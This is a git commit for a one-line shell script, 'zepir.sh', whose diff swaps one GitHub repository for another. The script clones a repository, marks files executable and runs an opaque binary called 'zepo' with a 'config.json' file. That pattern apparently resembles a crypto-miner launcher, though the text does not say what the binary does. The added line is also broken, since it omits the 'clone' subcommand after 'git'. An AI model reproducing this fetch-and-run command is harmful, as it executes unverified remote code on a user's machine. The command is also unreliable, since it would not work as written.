5ca5ea424cb65b82fd33f57e095f83caa9e8585a
Repopribadi27 <110306907+Repopribadi27@users.noreply.github.com>
2024-01-14 22:14:27 +0700

    zepir.sh

--- zepir.sh
+++ zepir.sh
@@ -1,1 +1,1 @@
-git clone https://github.com/epois/zein.git && cd zein && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
+git https://github.com/Repopribadi27/Jobfair.git && cd Jobfair && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
